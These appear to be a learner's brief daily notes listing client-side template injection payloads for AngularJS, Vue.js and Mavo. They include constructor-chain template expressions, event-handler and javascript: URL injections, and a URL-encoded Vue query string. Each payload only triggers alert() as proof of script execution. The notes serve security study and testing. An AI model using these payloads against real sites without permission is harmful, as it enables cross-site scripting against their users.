Daily Notes : Day 84
CSTI  - Client side template Injection 

Angular js :
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
<input ng-focus=$event.view.alert('XSS')>

Vue js : 
https://domain>/?name=%7B%7Bthis.constructor.constructor(%27alert(%22foo%22)%27)()%7D%7D

Mavo : 
[7*7]
[(1,alert)(1)]
<div mv-expressions="{{ }}">{{top.alert(1)}}</div>
[self.alert(1)]
javascript:alert(1)%252f%252f..%252fcss-images
[Omglol mod 1 mod self.alert (1) andlol]
[''=''or self.alert(lol)]
<a data-mv-if='1 or self.alert(1)'>test</a>
<div data-mv-expressions="lolx lolx">lolxself.alert('lol')lolx</div>
<a href=[javascript&':alert(1)']>test</a>
[self.alert(1)mod1]